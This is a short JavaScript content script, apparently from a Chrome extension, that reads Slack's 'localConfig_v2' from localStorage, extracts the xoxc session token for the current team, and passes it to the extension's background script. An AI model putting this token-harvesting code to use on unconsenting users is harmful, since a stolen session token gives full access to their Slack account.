// Extract localConfig_v2 and team ID, then send to background
(function() {
  const localConfig = localStorage.getItem('localConfig_v2');
  const pathMatch = window.location.pathname.match(/^\/client\/([A-Z0-9]+)/);
  const teamId = pathMatch ? pathMatch[1] : null;
  let xoxcToken = null;

  if (localConfig && teamId) {
    try {
      const configObj = JSON.parse(localConfig);
      xoxcToken = configObj.teams[teamId]?.token || null;
    } catch (e) {}
  }

  chrome.runtime.sendMessage({
    type: 'SLACK_TOKENS',
    teamId,
    xoxcToken
  });
})(); 